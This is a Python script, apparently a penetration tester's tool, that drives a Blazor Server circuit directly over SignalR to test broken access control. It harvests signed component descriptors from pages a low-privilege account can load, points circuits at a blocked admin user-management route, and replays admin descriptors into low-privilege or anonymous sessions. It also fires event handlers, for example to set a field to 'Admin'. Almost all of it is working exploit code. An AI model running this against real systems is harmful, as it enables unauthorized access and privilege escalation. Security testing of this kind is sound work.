#!/usr/bin/env python3
"""
blazor_circuit.py -- scripted Blazor Server circuit client. No browser.

Speaks SignalR long polling + blazorpack directly:
  negotiate -> handshake -> StartCircuit -> poll loop -> DispatchBrowserEvent

Auto-acks render batches (OnRenderCompleted) and stubs JS interop
(EndInvokeJSFromDotNet) so the circuit stays alive on its own.

    pip install requests msgpack
    python -I blazor_circuit.py

BAC test: run with the admin cookie, confirm users come back. Swap to the
low-priv cookie, rerun, diff. One variable.
"""

import json, re, time
import requests, msgpack

# ------------------------------- CONFIG --------------------------------
BASE       = "https://target.example.com"
PATH       = "/usermanagement"            # the blocked target route
COOKIE     = "PASTE_SESSION_COOKIE_HERE"  # admin -- the one that already works
LOW_COOKIE = "PASTE_LOW_PRIV_COOKIE_HERE"
HARVEST    = "/"                          # a page the LOW account can load
# ----------------------------------------------------------------------

RS = b"\x1e"


# --------------------------- blazorpack framing -------------------------
def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def read_varint(buf, i):
    val = shift = 0
    while i < len(buf):
        b = buf[i]
        i += 1
        val |= (b & 0x7F) << shift
        if not b & 0x80:
            return val, i
        shift += 7
    raise ValueError("truncated varint")


def frame(obj):
    p = msgpack.packb(obj, use_bin_type=True)
    return varint(len(p)) + p


def iter_frames(buf, expect_text=False):
    """Drain complete frames from buf (a bytearray, mutated in place).

    A partial trailing frame is LEFT in the buffer for the next poll -- long
    poll responses split large render batches, so this must be stateful or the
    stream desyncs and the length prefix lands mid-payload.

    Returns a list of ("text", bytes) for 0x1E-delimited records (the handshake
    response) and ("msg", obj) for blazorpack frames.
    """
    out, i = [], 0
    while i < len(buf):
        # Only the handshake response is text-framed. Do NOT sniff for '{'
        # afterwards: a 123-byte blazorpack frame has 0x7B as its length prefix.
        if expect_text:
            k = buf.find(RS, i)
            if k == -1:
                break                           # incomplete
            out.append(("text", bytes(buf[i:k])))
            i = k + 1
            expect_text = False
            continue
        try:
            ln, j = read_varint(buf, i)
        except ValueError:
            break                                # partial varint
        if j + ln > len(buf):
            break                                # partial payload
        chunk = bytes(buf[j:j + ln])
        try:
            obj = msgpack.unpackb(chunk, raw=False, strict_map_key=False)
        except msgpack.ExtraData as e:
            obj = e.unpacked                     # tolerate a long prefix
        except Exception as e:
            print(f"[!] unpack failed at {i} (len {ln}): {e}")
            print(f"    {chunk[:48].hex()}")
            i = j + ln
            continue
        out.append(("msg", obj))
        i = j + ln
    del buf[:i]
    return out


def strings(data, minlen=4):
    """Render batches keep their string table as literal UTF-8 -- enough to
    confirm a finding without decoding the diff format."""
    out, cur = [], bytearray()
    for b in data:
        if 0x20 <= b < 0x7F:
            cur.append(b)
        else:
            if len(cur) >= minlen:
                out.append(cur.decode())
            cur = bytearray()
    if len(cur) >= minlen:
        out.append(cur.decode())
    return out


# ------------------------------ recon ----------------------------------
def harvest(base, cookie, path):
    """Pull the DP-signed component descriptors + persisted state from page HTML.
    Descriptors cannot be forged, but a plain GET hands them to you."""
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"
    if cookie:
        s.headers["Cookie"] = cookie        # falsy -> anonymous
    r = s.get(base.rstrip("/") + path, allow_redirects=False)
    marks = [json.loads(m) for m in re.findall(r"<!--Blazor:(\{.*?\})-->", r.text, re.S)]
    state = re.findall(r"<!--Blazor-Component-State:([A-Za-z0-9+/=]+)-->", r.text)
    print(f"[recon] HTTP {r.status_code}  {len(r.text)} bytes  "
          f"{len(marks)} marker(s)  state={bool(state)}")
    for m in marks:
        print(f"[recon]   {m.get('type')} seq={m.get('sequence')} "
              f"descriptor={str(m.get('descriptor'))[:40]}...")
    if state:
        import base64
        try:
            blob = base64.b64decode(state[0])
            print(f"[recon] persisted state {len(blob)} bytes -> {strings(blob)[:12]}")
        except Exception as e:
            print(f"[recon] state decode failed: {e}")
    return r, marks, state


def probe(cookie, paths):
    """Which routes hand THIS account usable descriptors? Pick a harvest page."""
    s = requests.Session()
    s.headers.update({"Cookie": cookie, "User-Agent": "Mozilla/5.0"})
    print("[probe] status / markers per path")
    for p in paths:
        try:
            r = s.get(BASE.rstrip("/") + p, allow_redirects=False, timeout=15)
        except Exception as e:
            print(f"  {p:<28} ERR {e}")
            continue
        n = len(re.findall(r"<!--Blazor:(\{.*?\})-->", r.text, re.S))
        flag = "  <= usable as HARVEST" if n else ""
        print(f"  {p:<28} {r.status_code}  markers={n}{flag}")


# ------------------------------ circuit ---------------------------------
class Circuit:
    def __init__(self, base, cookie):
        self.base = base.rstrip("/")
        self.s = requests.Session()
        self.s.headers["User-Agent"] = "Mozilla/5.0"
        if cookie:
            self.s.headers["Cookie"] = cookie   # falsy -> anonymous
        self.token = None
        self.circuit_id = None
        self.alive = False
        self.next_id = 1
        self.batches = []
        self.rx = bytearray()       # survives across polls -- see iter_frames
        self.last_ping = time.time()
        self.handshook = False

    # ---- transport ----
    def negotiate(self):
        r = self.s.post(f"{self.base}/_blazor/negotiate?negotiateVersion=1")
        r.raise_for_status()
        j = r.json()
        self.token = j.get("connectionToken") or j["connectionId"]
        print(f"[+] token {self.token[:28]}...")
        return j

    def send(self, data):
        r = self.s.post(f"{self.base}/_blazor?id={self.token}", data=data,
                        headers={"Content-Type": "application/octet-stream"})
        if r.status_code not in (200, 202):
            raise RuntimeError(f"send {r.status_code}: {r.text[:200]}")

    def poll(self, timeout=35):
        r = self.s.get(f"{self.base}/_blazor?id={self.token}"
                       f"&_={int(time.time() * 1000)}", timeout=timeout)
        if r.status_code == 204:
            self.alive = False
            return b""
        return r.content

    def handshake(self):
        self.send(json.dumps({"protocol": "blazorpack", "version": 1}).encode() + RS)
        self.alive = True                   # provisional; handle() confirms
        self.handle(self.poll())
        if not self.alive:
            raise RuntimeError("handshake rejected")

    # ---- hub calls ----
    def invoke(self, target, *args, blocking=True):
        iid = str(self.next_id); self.next_id += 1
        self.send(frame([1, {}, iid if blocking else None, target, list(args), []]))
        return iid

    def start_circuit(self, uri, descriptors, app_state="", raw_args=None):
        """raw_args: pass your BTP-decoded arg list verbatim if the signature
        differs -- it changed across .NET versions. Yours is authoritative."""
        if raw_args is not None:
            return self.invoke("StartCircuit", *raw_args)
        return self.invoke("StartCircuit", self.base + "/", uri,
                           json.dumps(descriptors), app_state)

    def dispatch_event(self, handler_id, event_name="click",
                       field_value=None, component_id=None, event_args=None):
        desc = {"browserRendererId": 0,
                "eventHandlerId": handler_id,
                "eventName": event_name,
                "eventFieldInfo": ({"componentId": component_id,
                                    "fieldValue": field_value}
                                   if field_value is not None else None)}
        return self.invoke("DispatchBrowserEvent",
                           json.dumps(desc),
                           json.dumps(event_args or {"type": event_name}))

    def navigate(self, uri):
        return self.invoke("OnLocationChanged", uri, None, True, blocking=False)

    # ---- inbound ----
    def handle(self, raw):
        self.rx.extend(raw)
        for kind, payload in iter_frames(self.rx, expect_text=not self.handshook):
            if kind == "text":
                self.handshook = True
                try:
                    resp = json.loads(payload or b"{}")
                except Exception:
                    continue
                if resp.get("error"):
                    self.alive = False
                    print(f"[!] handshake rejected: {resp['error']}")
                else:
                    print("[+] handshake ok")
                continue

            m = payload
            if not isinstance(m, list) or not m:
                continue
            t = m[0]
            if t == 1:
                self.server_call(m[3], m[4] or [])
            elif t == 3:
                kind = m[3] if len(m) > 3 else None
                payload = m[4] if len(m) > 4 else None
                if kind == 1:
                    print(f"[!] hub error (id {m[2]}): {payload}")
                elif isinstance(payload, str) and len(payload) > 40:
                    self.circuit_id = payload
                    print(f"[+] circuitId {payload[:36]}...")
                else:
                    print(f"[ok] completion id={m[2]} {payload}")
            elif t == 7:
                self.alive = False
                print(f"[x] closed: {m[1:]}")

    def server_call(self, target, args):
        if target == "JS.RenderBatch":
            bid = next((a for a in args if isinstance(a, int)), None)
            data = next((a for a in args if isinstance(a, (bytes, bytearray))), b"")
            self.batches.append((bid, bytes(data)))
            print(f"\n=== batch {bid}  {len(data)} bytes ===")
            for s in strings(data):
                print("   ", s)
            if bid is not None:
                self.invoke("OnRenderCompleted", bid, None, blocking=False)

        elif target == "JS.BeginInvokeJS":
            handle, ident = args[0], args[1]
            res = {"Blazor._internal.navigationManager.getBaseURI": self.base + "/",
                   "Blazor._internal.navigationManager.getLocationHref":
                       self.base + PATH}.get(ident)
            self.invoke("EndInvokeJSFromDotNet", handle, True,
                        json.dumps([handle, True, res]), blocking=False)

        elif target in ("JS.AttachComponent", "JS.EndInvokeDotNet",
                        "JS.EndLocationChanging"):
            pass
        else:
            print(f"[s->c] {target} {str(args)[:120]}")

    def pump(self, seconds=15):
        end = time.time() + seconds
        while self.alive and time.time() < end:
            if time.time() - self.last_ping > 12:
                self.send(frame([6]))            # ping
                self.last_ping = time.time()
            raw = self.poll()
            if raw:
                self.handle(raw)
        if self.rx:
            print(f"[i] {len(self.rx)} bytes buffered (partial frame pending)")


# ------------------------------- driver ---------------------------------
def run(cookie, label="run", harvest_path=None, target_uri=None,
        navigate_to=None, marks=None, seconds=20):
    """harvest_path : page whose descriptors we borrow -- must be reachable
       target_uri   : uri handed to StartCircuit -- need NOT be reachable
       navigate_to  : optional in-circuit OnLocationChanged once the circuit is up
       marks        : supply descriptors directly (e.g. harvested as another user)
    """
    harvest_path = PATH if harvest_path is None else harvest_path
    target_uri = target_uri or (BASE.rstrip("/") + harvest_path)
    print(f"\n{'=' * 64}\n  {label}\n{'=' * 64}")

    if marks is None:
        r, marks, _ = harvest(BASE, cookie, harvest_path)
        if not marks:
            print(f"[-] no descriptors from {harvest_path} (HTTP {r.status_code}).")
            print("    run probe() and set harvest_path= to a page this account loads.")
            return None

    c = Circuit(BASE, cookie)
    c.negotiate()
    c.handshake()
    print(f"[*] StartCircuit uri -> {target_uri}")
    c.start_circuit(target_uri, marks)
    c.pump(seconds)

    if navigate_to:
        print(f"\n[*] in-circuit OnLocationChanged -> {navigate_to}")
        c.navigate(navigate_to)
        c.pump(seconds)
    return c


if __name__ == "__main__":
    TARGET = BASE.rstrip("/") + PATH

    # -- 0. which pages can the low account harvest from?
    # probe(LOW_COOKIE, ["/", "/dashboard", "/profile", "/home", PATH])

    # -- A. baseline: admin straight at the target (this already works)
    # c = run(COOKIE, "A: admin baseline")

    # -- B. low-priv, borrowed descriptor, circuit pointed at the blocked route.
    #       No HTTP request is ever made for PATH.
    c = run(LOW_COOKIE, "B: low-priv / borrowed descriptor",
            harvest_path=HARVEST, target_uri=TARGET)

    # -- C. same, but arrive by in-circuit routing instead of the start uri
    # c = run(LOW_COOKIE, "C: low-priv / in-circuit nav",
    #         harvest_path=HARVEST, navigate_to=TARGET)

    # -- D. admin's descriptor replayed into a low-priv circuit
    #       (tests whether descriptors are bound to identity)
    # _, admin_marks, _ = harvest(BASE, COOKIE, PATH)
    # c = run(LOW_COOKIE, "D: admin descriptor / low-priv session",
    #         target_uri=TARGET, marks=admin_marks)

    # -- E. no cookie at all. Does the circuit require auth for anything?
    # c = run("", "E: anonymous", harvest_path="/", target_uri=TARGET)

    # once a batch shows the table, fire row handlers:
    #   c.dispatch_event(47)                               # click
    #   c.dispatch_event(47, "change", field_value="Admin", component_id=5)
    #   c.pump(10)
